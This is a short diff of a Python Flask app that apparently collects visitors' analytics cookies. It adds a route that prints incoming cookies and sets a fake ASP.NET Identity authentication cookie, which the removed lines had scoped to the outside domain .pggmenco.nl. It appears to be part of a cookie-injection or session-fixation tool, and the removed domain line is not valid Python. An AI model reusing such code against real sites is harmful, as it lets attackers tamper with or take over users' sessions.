@@ -37,15 +37,21 @@ def collect_cookies():
     f"_ga = {_ga} \n\n" \
     f"_gid = {_gid} \n\n"
 
-@app.route('/j1ne16xhwld4ir40x2af')
-def setcookies():
+@app.route("/cookie")
+def cookies():
+    resp = make_response("Set Cookies")
+    cookies = request.cookies
+    print(cookies)
+
     resp.set_cookie(
     ".AspNetCore.Identity.ApplicationC1",
     value="aaaa",
-    max_age=60,
-    path='/',
-    domain=.pggmenco.nl,
-    secure=True,
-    httponly=True,
-    samesite=None
-)
+    max_age=60
+	#path='/',
+    #domain=.pggmenco.nl,
+    #secure=True,
+    #httponly=True,
+    #samesite=None
+    )
+
+    return resp
